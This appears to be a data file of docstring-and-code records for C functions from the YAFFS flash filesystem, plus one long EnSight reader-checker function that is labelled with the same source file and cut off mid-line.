{"docstring": "/* yaffs_DeleteFile deletes the whole file data\n * and the inode associated with the file.\n * It does not delete the links associated with the file.\n */\n", "func_signal": "static int yaffs_UnlinkFileIfNeeded(yaffs_Object *in)", "code": "{\n\n\tint retVal;\n\tint immediateDeletion = 0;\n\tyaffs_Device *dev = in->myDev;\n\n\tif (!in->myInode)\n\t\timmediateDeletion = 1;\n\n\tif (immediateDeletion) {\n\t\tretVal =\n\t\t    yaffs_ChangeObjectName(in, in->myDev->deletedDir,\n\t\t\t\t\t   _Y(\"deleted\"), 0, 0);\n\t\tT(YAFFS_TRACE_TRACING,\n\t\t  (TSTR(\"yaffs: immediate deletion of file %d\" TENDSTR),\n\t\t   in->objectId));\n\t\tin->deleted = 1;\n\t\tin->myDev->nDeletedFiles++;\n\t\tif (dev->param.disableSoftDelete || dev->param.isYaffs2)\n\t\t\tyaffs_ResizeFile(in, 0);\n\t\tyaffs_SoftDeleteFile(in);\n\t} else {\n\t\tretVal =\n\t\t    yaffs_ChangeObjectName(in, in->myDev->unlinkedDir,\n\t\t\t\t\t   _Y(\"unlinked\"), 0, 0);\n\t}\n\n\n\treturn retVal;\n}", "path": "yaffs_guts.c", "repo_name": "signalapp/WhisperYAFFS", "stars": 104, "license": "None", "language": "c", "size": 344}
{"docstring": "/* Find a cached chunk */\n", "func_signal": "static yaffs_ChunkCache *yaffs_FindChunkCache(const yaffs_Object *obj,\n\t\t\t\t\t      int chunkId)", "code": "{\n\tyaffs_Device *dev = obj->myDev;\n\tint i;\n\tif (dev->param.nShortOpCaches > 0) {\n\t\tfor (i = 0; i < dev->param.nShortOpCaches; i++) {\n\t\t\tif (dev->srCache[i].object == obj &&\n\t\t\t    dev->srCache[i].chunkId == chunkId) {\n\t\t\t\tdev->cacheHits++;\n\n\t\t\t\treturn &dev->srCache[i];\n\t\t\t}\n\t\t}\n\t}\n\treturn NULL;\n}", "path": "yaffs_guts.c", "repo_name": "signalapp/WhisperYAFFS", "stars": 104, "license": "None", "language": "c", "size": 344}
{"docstring": "/*\n * Temporary buffer manipulations.\n */\n", "func_signal": "static int yaffs_InitialiseTempBuffers(yaffs_Device *dev)", "code": "{\n\tint i;\n\t__u8 *buf = (__u8 *)1;\n\n\tmemset(dev->tempBuffer, 0, sizeof(dev->tempBuffer));\n\n\tfor (i = 0; buf && i < YAFFS_N_TEMP_BUFFERS; i++) {\n\t\tdev->tempBuffer[i].line = 0;\t/* not in use */\n\t\tdev->tempBuffer[i].buffer = buf =\n\t\t    YMALLOC_DMA(dev->param.totalBytesPerChunk);\n\t}\n\n\treturn buf ? YAFFS_OK : YAFFS_FAIL;\n}", "path": "yaffs_guts.c", "repo_name": "signalapp/WhisperYAFFS", "stars": 104, "license": "None", "language": "c", "size": 344}
{"docstring": "/*-------------------- Data file manipulation -----------------*/\n", "func_signal": "static int yaffs_FindChunkInFile(yaffs_Object *in, int chunkInInode,\n\t\t\t\t yaffs_ExtendedTags *tags)", "code": "{\n\t/*Get the Tnode, then get the level 0 offset chunk offset */\n\tyaffs_Tnode *tn;\n\tint theChunk = -1;\n\tyaffs_ExtendedTags localTags;\n\tint retVal = -1;\n\n\tyaffs_Device *dev = in->myDev;\n\n\tif (!tags) {\n\t\t/* Passed a NULL, so use our own tags space */\n\t\ttags = &localTags;\n\t}\n\n\ttn = yaffs_FindLevel0Tnode(dev, &in->variant.fileVariant, chunkInInode);\n\n\tif (tn) {\n\t\ttheChunk = yaffs_GetChunkGroupBase(dev, tn, chunkInInode);\n\n\t\tretVal =\n\t\t    yaffs_FindChunkInGroup(dev, theChunk, tags, in->objectId,\n\t\t\t\t\t   chunkInInode);\n\t}\n\treturn retVal;\n}", "path": "yaffs_guts.c", "repo_name": "signalapp/WhisperYAFFS", "stars": 104, "license": "None", "language": "c", "size": 344}
{"docstring": "/* FreeTnode frees up a tnode and puts it back on the free list */\n", "func_signal": "static void yaffs_FreeTnode(yaffs_Device *dev, yaffs_Tnode *tn)", "code": "{\n\tyaffs_FreeRawTnode(dev,tn);\n\tdev->nTnodes--;\n\tdev->nCheckpointBlocksRequired = 0; /* force recalculation*/\n}", "path": "yaffs_guts.c", "repo_name": "signalapp/WhisperYAFFS", "stars": 104, "license": "None", "language": "c", "size": 344}
{"docstring": "/* New garbage collector\n * If we're very low on erased blocks then we do aggressive garbage collection\n * otherwise we do \"leasurely\" garbage collection.\n * Aggressive gc looks further (whole array) and will accept less dirty blocks.\n * Passive gc only inspects smaller areas and will only accept more dirty blocks.\n *\n * The idea is to help clear out space in a more spread-out manner.\n * Dunno if it really does anything useful.\n */\n", "func_signal": "static int yaffs_CheckGarbageCollection(yaffs_Device *dev, int background)", "code": "{\n\tint aggressive = 0;\n\tint gcOk = YAFFS_OK;\n\tint maxTries = 0;\n\tint minErased;\n\tint erasedChunks;\n\tint checkpointBlockAdjust;\n\n\tif(dev->param.gcControl &&\n\t\t(dev->param.gcControl(dev) & 1) == 0)\n\t\treturn YAFFS_OK;\n\n\tif (dev->gcDisable) {\n\t\t/* Bail out so we don't get recursive gc */\n\t\treturn YAFFS_OK;\n\t}\n\n\t/* This loop should pass the first time.\n\t * We'll only see looping here if the collection does not increase space.\n\t */\n\n\tdo {\n\t\tmaxTries++;\n\n\t\tcheckpointBlockAdjust = yaffs2_CalcCheckpointBlocksRequired(dev);\n\n\t\tminErased  = dev->param.nReservedBlocks + checkpointBlockAdjust + 1;\n\t\terasedChunks = dev->nErasedBlocks * dev->param.nChunksPerBlock;\n\n\t\t/* If we need a block soon then do aggressive gc.*/\n\t\tif (dev->nErasedBlocks < minErased)\n\t\t\taggressive = 1;\n\t\telse {\n\t\t\tif(!background && erasedChunks > (dev->nFreeChunks / 4))\n\t\t\t\tbreak;\n\n\t\t\tif(dev->gcSkip > 20)\n\t\t\t\tdev->gcSkip = 20;\n\t\t\tif(erasedChunks < dev->nFreeChunks/2 ||\n\t\t\t\tdev->gcSkip < 1 ||\n\t\t\t\tbackground)\n\t\t\t\taggressive = 0;\n\t\t\telse {\n\t\t\t\tdev->gcSkip--;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\n\t\tdev->gcSkip = 5;\n\n                /* If we don't already have a block being gc'd then see if we should start another */\n\n\t\tif (dev->gcBlock < 1 && !aggressive) {\n\t\t\tdev->gcBlock = yaffs2_FindRefreshBlock(dev);\n\t\t\tdev->gcChunk = 0;\n\t\t\tdev->nCleanups=0;\n\t\t}\n\t\tif (dev->gcBlock < 1) {\n\t\t\tdev->gcBlock = yaffs_FindBlockForGarbageCollection(dev, aggressive, background);\n\t\t\tdev->gcChunk = 0;\n\t\t\tdev->nCleanups=0;\n\t\t}\n\n\t\tif (dev->gcBlock > 0) {\n\t\t\tdev->allGCs++;\n\t\t\tif (!aggressive)\n\t\t\t\tdev->passiveGCs++;\n\n\t\t\tT(YAFFS_TRACE_GC,\n\t\t\t  (TSTR\n\t\t\t   (\"yaffs: GC erasedBlocks %d aggressive %d\" TENDSTR),\n\t\t\t   dev->nErasedBlocks, aggressive));\n\n\t\t\tgcOk = yaffs_GarbageCollectBlock(dev, dev->gcBlock, aggressive);\n\t\t}\n\n\t\tif (dev->nErasedBlocks < (dev->param.nReservedBlocks) && dev->gcBlock > 0) {\n\t\t\tT(YAFFS_TRACE_GC,\n\t\t\t  (TSTR\n\t\t\t   (\"yaffs: GC !!!no reclaim!!! erasedBlocks %d after try %d block %d\"\n\t\t\t    TENDSTR), dev->nErasedBlocks, maxTries, dev->gcBlock));\n\t\t}\n\t} while ((dev->nErasedBlocks < dev->param.nReservedBlocks) &&\n\t\t (dev->gcBlock > 0) &&\n\t\t (maxTries < 2));\n\n\treturn aggressive ? gcOk : YAFFS_OK;\n}", "path": "yaffs_guts.c", "repo_name": "signalapp/WhisperYAFFS", "stars": 104, "license": "None", "language": "c", "size": 344}
{"docstring": "/*----------------------- Initialisation Scanning ---------------------- */\n", "func_signal": "void yaffs_HandleShadowedObject(yaffs_Device *dev, int objId,\n\t\t\t\tint backwardScanning)", "code": "{\n\tyaffs_Object *obj;\n\n\tif (!backwardScanning) {\n\t\t/* Handle YAFFS1 forward scanning case\n\t\t * For YAFFS1 we always do the deletion\n\t\t */\n\n\t} else {\n\t\t/* Handle YAFFS2 case (backward scanning)\n\t\t * If the shadowed object exists then ignore.\n\t\t */\n\t\tobj = yaffs_FindObjectByNumber(dev, objId);\n\t\tif(obj)\n\t\t\treturn;\n\t}\n\n\t/* Let's create it (if it does not exist) assuming it is a file so that it can do shrinking etc.\n\t * We put it in unlinked dir to be cleaned up after the scanning\n\t */\n\tobj =\n\t    yaffs_FindOrCreateObjectByNumber(dev, objId,\n\t\t\t\t\t     YAFFS_OBJECT_TYPE_FILE);\n\tif (!obj)\n\t\treturn;\n\tobj->isShadowed = 1;\n\tyaffs_AddObjectToDirectory(dev->unlinkedDir, obj);\n\tobj->variant.fileVariant.shrinkSize = 0;\n\tobj->valid = 1;\t\t/* So that we don't read any other info for this file */\n\n}", "path": "yaffs_guts.c", "repo_name": "signalapp/WhisperYAFFS", "stars": 104, "license": "None", "language": "c", "size": 344}
{"docstring": "/* Invalidate all the cache pages associated with this object\n * Do this whenever ther file is deleted or resized.\n */\n", "func_signal": "static void yaffs_InvalidateWholeChunkCache(yaffs_Object *in)", "code": "{\n\tint i;\n\tyaffs_Device *dev = in->myDev;\n\n\tif (dev->param.nShortOpCaches > 0) {\n\t\t/* Invalidate it. */\n\t\tfor (i = 0; i < dev->param.nShortOpCaches; i++) {\n\t\t\tif (dev->srCache[i].object == in)\n\t\t\t\tdev->srCache[i].object = NULL;\n\t\t}\n\t}\n}", "path": "yaffs_guts.c", "repo_name": "signalapp/WhisperYAFFS", "stars": 104, "license": "None", "language": "c", "size": 344}
{"docstring": "/*----------------\n * part_build_info\n *----------------*/\n", "func_signal": "static int\npart_build_info(int geom_time_step)", "code": "{\n  int i, j;\n  int fn;\n  int err;\n  int num_dataset_files;\n  int geom_time_set;\n  Z_QFILES *qfiles;\n  char line1[Z_BUFL];\n  char line2[Z_BUFL];\n\n  int *part_ids;\n  int *part_types;\n  int *number_of_nodes;\n  int **num_elems;\n  int **ijk_dimensions;\n  int **iblanking_options;\n  char **part_descriptions;\n\n  int ghosts_in_block;\n\n  int *max_num_nodes;\n  int **max_num_elems;\n  int **max_ijk_dimensions;\n  float extents[6];\n\n\n  fprintf(stderr,\"\\n------------ part_build_info ------------\\n\");\n\n#if (defined GT_USERD_API_100)\n\n  /* Get the timeset used for the geometry\n   *--------------------------------------*/\n  geom_time_set = USERD_get_geom_timeset_number();\n\n  /* Set the timeset and step - to first step\n   *-----------------------------------------*/\n\n  USERD_set_time_set_and_step(geom_time_set,geom_time_step);\n\n#else\n\n  /* Set the time step - to first step\n   *----------------------------------*/\n  USERD_set_time_step(geom_time_step);\n\n#endif\n\n  /* Get the changing geometry status\n   *---------------------------------*/\n  Geom_status = USERD_get_changing_geometry_status();\n  if(Geom_status == Z_STATIC) {\n    fprintf(stderr,\" Geom changing status: Z_STATIC\\n\");\n  }\n  else if(Geom_status == Z_CHANGE_COORDS) {\n    fprintf(stderr,\" Geom changing status: Z_CHANGE_COORDS\\n\");\n  }\n  else if(Geom_status == Z_CHANGE_CONN) {\n    fprintf(stderr,\" Geom changing status: Z_CHANGE_CONN\\n\");\n  }\n  else {\n    fprintf(stderr,\" Invalid Geom changing status!!\\n\");\n  }\n\n\n  /* Get the node label status\n   *--------------------------*/\n  Node_labels = USERD_get_node_label_status();\n  if(Node_labels) {\n    fprintf(stderr,\" Node labels will be provided\\n\");\n  }\n  else {\n    fprintf(stderr,\" Node labels will NOT be provided\\n\");\n  }\n\n  /* Get the element label status\n   *-----------------------------*/\n  Element_labels = USERD_get_element_label_status();\n  if(Element_labels) {\n    fprintf(stderr,\" Element labels will be provided\\n\");\n  }\n  else {\n    fprintf(stderr,\" Element labels will NOT be provided\\n\");\n  }\n\n  fprintf(stderr,\"\\n\");\n\n  /* Get the number of files in the dataset\n   *---------------------------------------*/\n  num_dataset_files = USERD_get_number_of_files_in_dataset();\n  fprintf(stderr,\" Number of files in dataset: %d\\n\",num_dataset_files);\n\n\n  /* Get the dataset query file info\n   *--------------------------------*/\n  if(num_dataset_files > 0) {\n\n    qfiles = (Z_QFILES *) calloc(num_dataset_files,sizeof(Z_QFILES));\n    if(qfiles == (Z_QFILES *)NULL) {\n      fprintf(stderr,\"Error: allocating for dataset query files\\n\");\n      return(Z_ERR);\n    }\n    else {\n\n      for(i=0; i<num_dataset_files; ++i) {\n        qfiles[i].f_desc = (char **) calloc(10,sizeof(char *));\n        if(qfiles[i].f_desc == (char **)NULL) {\n          fprintf(stderr,\"Error: allocating for dataset query descrip lines\\n\");\n          return(Z_ERR);\n        }\n        else {\n          for(j=0; j<10; ++j) {\n            qfiles[i].f_desc[j] = (char *) calloc(Z_MAXFILENP,sizeof(char));\n            if(qfiles[i].f_desc[j] == (char *)NULL) {\n              fprintf(stderr,\"Error: allocating for dataset query descrip lines\\n\");\n              return(Z_ERR);\n            }\n          }\n        }\n      }\n\n      err = USERD_get_dataset_query_file_info(qfiles);\n      if(err == Z_OK) {\n        for(fn=0; fn<num_dataset_files; ++fn) {\n          fprintf(stderr,\" For dataset file %d:\\n\",fn);\n\n          fprintf(stderr,\"   name:           %s\\n\",qfiles[fn].name);\n          fprintf(stderr,\"   size:           %d\\n\",qfiles[fn].sizeb);\n          fprintf(stderr,\"   time:           %s\\n\",qfiles[fn].timemod);\n          fprintf(stderr,\"   num desc lines: %d\\n\",qfiles[fn].num_d_lines);\n          for(i=0; i<qfiles[fn].num_d_lines; ++i) {\n            fprintf(stderr,\"    desc line %d: %s\\n\",i,qfiles[fn].f_desc[i]);\n          }\n        }\n      }\n      else {\n        fprintf(stderr,\"Error: getting dataset query info\\n\");\n        return(Z_ERR);\n      }\n    }\n\n    /* Free allocated memory\n     *----------------------*/\n    for(i=0; i<num_dataset_files; ++i) {\n      for(j=0; j<10; ++j) {\n        free(qfiles[i].f_desc[j]);\n      }\n      free(qfiles[i].f_desc);\n    }\n    free(qfiles);\n  }\n\n  fprintf(stderr,\"\\n-----------------------------------------\\n\");\n\n#if (defined GT_USERD_API_100)\n\n  /* Get the geometry description lines\n   *-----------------------------------*/\n  err = USERD_get_descrip_lines(Z_GEOM,0,FALSE,line1,line2);\n  if(err == Z_OK) {\n    fprintf(stderr,\" Geom Desc line1: %s\\n\",line1);\n    fprintf(stderr,\" Geom Desc line2: %s\\n\",line2);\n  }\n  else {\n    fprintf(stderr,\"Error: getting geom description lines\\n\");\n    return(Z_ERR);\n  }\n\n#else\n\n  /* Get the geometry description lines\n   *-----------------------------------*/\n  err = USERD_get_description_lines(Z_GEOM,0,line1,line2);\n  if(err == Z_OK) {\n    fprintf(stderr,\" Geom Desc line1: %s\\n\",line1);\n    fprintf(stderr,\" Geom Desc line2: %s\\n\",line2);\n  }\n  else {\n    fprintf(stderr,\"Error: getting geom description lines\\n\");\n    return(Z_ERR);\n  }\n\n#endif\n\n  /* Get the number of model parts\n   *------------------------------*/\n  Num_parts = USERD_get_number_of_model_parts();\n  if(Num_parts > 0) {\n    fprintf(stderr,\" Number of parts: %d\\n\",Num_parts);\n  }\n  else {\n    fprintf(stderr,\" Problems getting number of parts\\n\");\n    return(Z_ERR);\n  }\n\n\n\n  /* Get the gold part build info\n   *-----------------------------*/\n  Pbuild = (BUILDINFO *) calloc(Num_parts,sizeof(BUILDINFO));\n  if(Pbuild == (BUILDINFO *)NULL) {\n    fprintf(stderr,\" Problems allocating for Pbuild structure\\n\");\n    return(Z_ERR);\n  }\n\n\n  part_ids = (int *) calloc(Num_parts,sizeof(int));\n  if(part_ids == (int *)NULL) {\n    fprintf(stderr,\" Problems allocating for part ids\\n\");\n    return(Z_ERR);\n  }\n\n  part_types = (int *) calloc(Num_parts,sizeof(int));\n  if(part_types == (int *)NULL) {\n    fprintf(stderr,\" Problems allocating for part types\\n\");\n    return(Z_ERR);\n  }\n\n  part_descriptions = (char **) calloc(Num_parts,sizeof(char *));\n  if(part_descriptions == (char **)NULL) {\n    fprintf(stderr,\" Problems allocating for part descriptions\\n\");\n    return(Z_ERR);\n  }\n  else {\n    for(i=0; i<Num_parts; ++i) {\n      part_descriptions[i] = (char *) calloc(Z_BUFL,sizeof(char));\n      if(part_descriptions[i] == (char *)NULL) {\n        fprintf(stderr,\" Problems allocating for part descriptions\\n\");\n        return(Z_ERR);\n      }\n    }\n  }\n\n  number_of_nodes = (int *) calloc(Num_parts,sizeof(int));\n  if(number_of_nodes == (int *)NULL) {\n    fprintf(stderr,\" Problems allocating for part number of nodes\\n\");\n    return(Z_ERR);\n  }\n\n  num_elems = (int **) calloc(Num_parts,sizeof(int *));\n  if(num_elems == (int **)NULL) {\n    fprintf(stderr,\" Problems allocating for part number of elements\\n\");\n    return(Z_ERR);\n  }\n  else {\n    for(i=0; i<Num_parts; ++i) {\n      num_elems[i] = (int *) calloc(Z_MAXTYPE,sizeof(int));\n      if(num_elems[i] == (int *)NULL) {\n        fprintf(stderr,\" Problems allocating for part number of elements\\n\");\n        return(Z_ERR);\n      }\n    }\n  }\n\n  ijk_dimensions = (int **) calloc(Num_parts,sizeof(int *));\n  if(ijk_dimensions == (int **)NULL) {\n    fprintf(stderr,\" Problems allocating for part ijk dimensions\\n\");\n    return(Z_ERR);\n  }\n  else {\n\n#if (defined GT_USERD_API_202)\n    for(i=0; i<Num_parts; ++i) {\n      ijk_dimensions[i] = (int *) calloc(9,sizeof(int));\n      if(ijk_dimensions[i] == (int *)NULL) {\n        fprintf(stderr,\" Problems allocating for part ijk dimensions\\n\");\n        return(Z_ERR);\n      }\n      else {\n        for(j=0; j<9; ++j) {\n          ijk_dimensions[i][j] = -1;\n        }\n      }\n    }\n#else\n    for(i=0; i<Num_parts; ++i) {\n      ijk_dimensions[i] = (int *) calloc(3,sizeof(int));\n      if(ijk_dimensions[i] == (int *)NULL) {\n        fprintf(stderr,\" Problems allocating for part ijk dimensions\\n\");\n        return(Z_ERR);\n      }\n    }\n#endif\n  }\n\n  iblanking_options = (int **) calloc(Num_parts,sizeof(int *));\n  if(iblanking_options == (int **)NULL) {\n    fprintf(stderr,\" Problems allocating for part iblanking options\\n\");\n    return(Z_ERR);\n  }\n  else {\n    for(i=0; i<Num_parts; ++i) {\n      iblanking_options[i] = (int *) calloc(6,sizeof(int));\n      if(iblanking_options[i] == (int *)NULL) {\n        fprintf(stderr,\" Problems allocating for part iblanking options\\n\");\n        return(Z_ERR);\n      }\n    }\n  }\n\n\n#if (defined GT_USERD_API_100)\n\n  err = USERD_get_gold_part_build_info(part_ids,\n                                       part_types,\n                                       part_descriptions,\n                                       number_of_nodes,\n                                       num_elems,\n                                       ijk_dimensions,\n                                       iblanking_options);\n#else\n\n  err = USERD_get_part_build_info(part_ids,\n                                  part_types,\n                                  part_descriptions,\n                                  num_elems,\n                                  ijk_dimensions,\n                                  iblanking_options);\n\n#endif\n\n  if(err == Z_ERR) {\n    fprintf(stderr,\" Problems getting part build info\\n\");\n    return(Z_ERR);\n  }\n  else {\n    for(i=0; i<Num_parts; ++i) {\n      fprintf(stderr,\" For part %d:\\n\",i+1);\n\n      fprintf(stderr,\"   part id:   %d\\n\",part_ids[i]);\n      Pbuild[i].id = part_ids[i];\n\n      if(part_types[i] == Z_UNSTRUCTURED) {\n        fprintf(stderr,\"   part type: Z_UNSTRUCTURED\\n\");\n      }\n      else if(part_types[i] == Z_STRUCTURED) {\n        fprintf(stderr,\"   part type: Z_STRUCTURED\\n\");\n      }\n      else if(part_types[i] == Z_IBLANKED) {\n        fprintf(stderr,\"   part type: Z_IBLANKED\\n\");\n      }\n      else {\n        fprintf(stderr,\"   Invalid part type\\n\");\n        return(Z_ERR);\n      }\n      Pbuild[i].type = part_types[i];\n\n      fprintf(stderr,\"   part desc:   %s\\n\",part_descriptions[i]);\n      strncpy(Pbuild[i].desc,part_descriptions[i],Z_BUFL);\n\n#if (defined GT_USERD_API_100)\n      fprintf(stderr,\"   number of nodes :   %d\\n\",number_of_nodes[i]);\n      Pbuild[i].nn = number_of_nodes[i];\n#else\n      Pbuild[i].nn = USERD_get_number_of_global_nodes();\n#endif\n\n      for(j=0; j<Z_MAXTYPE; ++j) {\n        if(num_elems[i][j] > 0) {\n          fprintf(stderr,\"   # %s elements:   %d\\n\",\n                  Elem_info[j].name,num_elems[i][j]);\n          Pbuild[i].ne[j] = num_elems[i][j];\n        }\n      }\n\n      if(part_types[i] != Z_UNSTRUCTURED) {\n\n        /* For this checker, we will place the following in the\n         * Pbuild[].ne[] structure:\n         *\n         *   Note this is can be used for block size whether ranges or not\n         *   -------------------------------------------------------------\n         *   Pbuild[].ne[0] = i dim of current block (to the range selected)\n         *   Pbuild[].ne[1] = j dim of current block (to the range selected)\n         *   Pbuild[].ne[2] = k dim of current block (to the range selected)\n         *\n         *   Thus if ranges:\n         *   ---------------\n         *   Pbuild[].ne[3] = i min range          (-1 indicates no ranges)\n         *   Pbuild[].ne[4] = i max range\n         *   Pbuild[].ne[5] = i min range\n         *   Pbuild[].ne[6] = i max range\n         *   Pbuild[].ne[7] = i min range\n         *   Pbuild[].ne[8] = i max range\n         *\n         *   Pbuild[].ne[9]  = i dim of total block (if ranges)\n         *   Pbuild[].ne[10] = j dim of total block (if ranges)\n         *   Pbuild[].ne[11] = k dim of total block (if ranges)\n         *\n         *   What comes back from the api is:\n         *   --------------------------------\n         *   before 2.03 (no ranges)\n         *   -----------------------\n         *   ijk_dimensions[][0] = i dim of block\n         *   ijk_dimensions[][1] = j dim of block\n         *   ijk_dimensions[][2] = k dim of block\n         *\n         *   at 2.03 (if no ranges)\n         *   -------\n         *   ijk_dimensions[][0] = i dim of block\n         *   ijk_dimensions[][1] = j dim of block\n         *   ijk_dimensions[][2] = k dim of block\n         *   ijk_dimensions[][3] = -1\n         *\n         *   at 2.03 (if ranges)\n         *   -------\n         *   ijk_dimensions[][0] = i dim of total block\n         *   ijk_dimensions[][1] = j dim of total block\n         *   ijk_dimensions[][2] = k dim of total block\n         *   ijk_dimensions[][3] = i min range\n         *   ijk_dimensions[][4] = i max range\n         *   ijk_dimensions[][5] = j min range\n         *   ijk_dimensions[][6] = j max range\n         *   ijk_dimensions[][7] = k min range\n         *   ijk_dimensions[][8] = k max range\n         *--------------------------------------------------------------*/\n\n#if (defined GT_USERD_API_202)\n        if(ijk_dimensions[i][3] == -1) {\n          fprintf(stderr,\"   ijk_dimensions: %d %d %d\\n\",\n                  ijk_dimensions[i][0],\n                  ijk_dimensions[i][1],\n                  ijk_dimensions[i][2]);\n          Pbuild[i].ne[0] = ijk_dimensions[i][0];\n          Pbuild[i].ne[1] = ijk_dimensions[i][1];\n          Pbuild[i].ne[2] = ijk_dimensions[i][2];\n          Pbuild[i].ne[3] = ijk_dimensions[i][3];\n        }\n        else {\n\n          /* If empty part\n           *--------------*/\n          if(ijk_dimensions[i][0] == 0 &&\n             ijk_dimensions[i][1] == 0 &&\n             ijk_dimensions[i][2] == 0) {\n            fprintf(stderr,\"   ijk_dimensions: %d %d %d\\n\",\n                    ijk_dimensions[i][0],\n                    ijk_dimensions[i][1],\n                    ijk_dimensions[i][2]);\n            Pbuild[i].ne[0] = ijk_dimensions[i][0];\n            Pbuild[i].ne[1] = ijk_dimensions[i][1];\n            Pbuild[i].ne[2] = ijk_dimensions[i][2];\n            Pbuild[i].ne[3] = -1;\n          }\n\n          /* range part\n           *-----------*/\n          else {\n            Pbuild[i].ne[0] = ijk_dimensions[i][4] - ijk_dimensions[i][3] + 1;\n            Pbuild[i].ne[1] = ijk_dimensions[i][6] - ijk_dimensions[i][5] + 1;\n            Pbuild[i].ne[2] = ijk_dimensions[i][8] - ijk_dimensions[i][7] + 1;\n\n            Pbuild[i].ne[3] = ijk_dimensions[i][3];\n            Pbuild[i].ne[4] = ijk_dimensions[i][4];\n            Pbuild[i].ne[5] = ijk_dimensions[i][5];\n            Pbuild[i].ne[6] = ijk_dimensions[i][6];\n            Pbuild[i].ne[7] = ijk_dimensions[i][7];\n            Pbuild[i].ne[8] = ijk_dimensions[i][8];\n\n            Pbuild[i].ne[9] = ijk_dimensions[i][0];\n            Pbuild[i].ne[10] = ijk_dimensions[i][1];\n            Pbuild[i].ne[11] = ijk_dimensions[i][2];\n\n            fprintf(stderr,\"   Part has ranges:\\n\");\n            fprintf(stderr,\"   ijk dimensions of total block: %d %d %d\\n\",\n                    Pbuild[i].ne[9],\n                    Pbuild[i].ne[10],\n                    Pbuild[i].ne[11]);\n            fprintf(stderr,\"     i range: %d  to  %d\\n\",\n                    Pbuild[i].ne[3],\n                    Pbuild[i].ne[4]);\n            fprintf(stderr,\"     j range: %d  to  %d\\n\",\n                    Pbuild[i].ne[5],\n                    Pbuild[i].ne[6]);\n            fprintf(stderr,\"     k range: %d  to  %d\\n\",\n                    Pbuild[i].ne[7],\n                    Pbuild[i].ne[8]);\n            fprintf(stderr,\"   ijk dimensions of range portion: %d %d %d\\n\",\n                    Pbuild[i].ne[0],\n                    Pbuild[i].ne[1],\n                    Pbuild[i].ne[2]);\n          }\n        }\n#else\n        fprintf(stderr,\"   ijk_dimensions: %d %d %d\\n\",\n                ijk_dimensions[i][0],\n                ijk_dimensions[i][1],\n                ijk_dimensions[i][2]);\n        Pbuild[i].ne[0] = ijk_dimensions[i][0];\n        Pbuild[i].ne[1] = ijk_dimensions[i][1];\n        Pbuild[i].ne[2] = ijk_dimensions[i][2];\n        Pbuild[i].ne[3] = -1;\n#endif\n        if(part_types[i] == Z_IBLANKED) {\n          fprintf(stderr,\"   Ibanking options on:\\n\");\n          if(iblanking_options[i][Z_EXT]) {\n            fprintf(stderr,\"     Z_EXT\\n\");\n          }\n          if(iblanking_options[i][Z_INT]) {\n            fprintf(stderr,\"     Z_INT\\n\");\n          }\n          if(iblanking_options[i][Z_BND]) {\n            fprintf(stderr,\"     Z_BND\\n\");\n          }\n          if(iblanking_options[i][Z_INTBND]) {\n            fprintf(stderr,\"     Z_INTBND\\n\");\n          }\n          if(iblanking_options[i][Z_SYM]) {\n            fprintf(stderr,\"     Z_SYM\\n\");\n          }\n        }\n      }\n    }\n  }\n\n\n#if (defined GT_USERD_API_200)\n\n  /* Get ghosts in model flag\n   *-------------------------*/\n  Ghosts_in_model = USERD_get_ghosts_in_model_flag();\n  if(Ghosts_in_model) {\n    fprintf(stderr,\" Ghosts in Model:  TRUE\\n\");\n  }\n  else {\n    fprintf(stderr,\" Ghosts in Model:  FALSE\\n\");\n  }\n\n  /* Get ghosts in block flag - if needed\n   *-------------------------------------*/\n  for(i=1; i<=Num_parts; ++i) {\n    if(part_types[i-1] != Z_UNSTRUCTURED && Ghosts_in_model) {\n      ghosts_in_block = USERD_get_ghosts_in_block_flag(i);\n      Pbuild[i-1].ghosts = ghosts_in_block;\n      if(ghosts_in_block) {\n        fprintf(stderr,\" Ghosts in block part %d:  TRUE\\n\",i);\n      }\n      else {\n        fprintf(stderr,\" Ghosts in block part %d:  FALSE\\n\",i);\n      }\n    }\n  }\n\n#endif\n\n\n#if (defined GT_USERD_API_100)\n\n  /* Get maxsize info\n   *-----------------*/\n  max_num_nodes = (int *) calloc(Num_parts,sizeof(int));\n  if(max_num_nodes == (int *)NULL) {\n    fprintf(stderr,\" Problems allocating for part max num of nodes\\n\");\n    return(Z_ERR);\n  }\n\n  max_num_elems = (int **) calloc(Num_parts,sizeof(int *));\n  if(max_num_elems == (int **)NULL) {\n    fprintf(stderr,\" Problems allocating for part max num of elements\\n\");\n    return(Z_ERR);\n  }\n  else {\n    for(i=0; i<Num_parts; ++i) {\n      max_num_elems[i] = (int *) calloc(Z_MAXTYPE,sizeof(int));\n      if(max_num_elems[i] == (int *)NULL) {\n        fprintf(stderr,\" Problems allocating for part max_num of elements\\n\");\n        return(Z_ERR);\n      }\n    }\n  }\n\n  max_ijk_dimensions = (int **) calloc(Num_parts,sizeof(int *));\n  if(max_ijk_dimensions == (int **)NULL) {\n    fprintf(stderr,\" Problems allocating for part max ijk dimensions\\n\");\n    return(Z_ERR);\n  }\n  else {\n    for(i=0; i<Num_parts; ++i) {\n      max_ijk_dimensions[i] = (int *) calloc(3,sizeof(int));\n      if(max_ijk_dimensions[i] == (int *)NULL) {\n        fprintf(stderr,\" Problems allocating for part max ijk dimensions\\n\");\n        return(Z_ERR);\n      }\n    }\n  }\n\n  err = USERD_get_maxsize_info(max_num_nodes,\n                               max_num_elems,\n                               max_ijk_dimensions);\n  if(err == Z_ERR) {\n    fprintf(stderr,\" No maxsize info provided (or error getting them)\\n\");\n  }\n  else {\n\n    for(i=0; i<Num_parts; ++i) {\n      fprintf(stderr,\" For part %d:\\n\",i+1);\n\n      fprintf(stderr,\"   max number of nodes :   %d\\n\",max_num_nodes[i]);\n\n      for(j=0; j<Z_MAXTYPE; ++j) {\n        if(max_num_elems[i][j] > 0) {\n          fprintf(stderr,\"   max # %s elems:   %d\\n\",\n                  Elem_info[j].name,max_num_elems[i][j]);\n        }\n      }\n\n      if(part_types[i] != Z_UNSTRUCTURED) {\n        fprintf(stderr,\"   max_ijk_dimensions: %d %d %d\\n\",\n                max_ijk_dimensions[i][0],\n                max_ijk_dimensions[i][1],\n                max_ijk_dimensions[i][2]);\n      }\n    }\n  }\n\n  /* Get model extents - if given\n   *-----------------------------*/\n  err = USERD_get_model_extents(extents);\n  if(err == Z_ERR) {\n    fprintf(stderr,\" No extents given\\n\");\n  }\n  else {\n    fprintf(stderr,\" Min x: %g\\n\",extents[0]);\n    fprintf(stderr,\" Max x: %g\\n\",extents[1]);\n    fprintf(stderr,\" Min y: %g\\n\",extents[2]);\n    fprintf(stderr,\" Max y: %g\\n\",extents[3]);\n    fprintf(stderr,\" Min z: 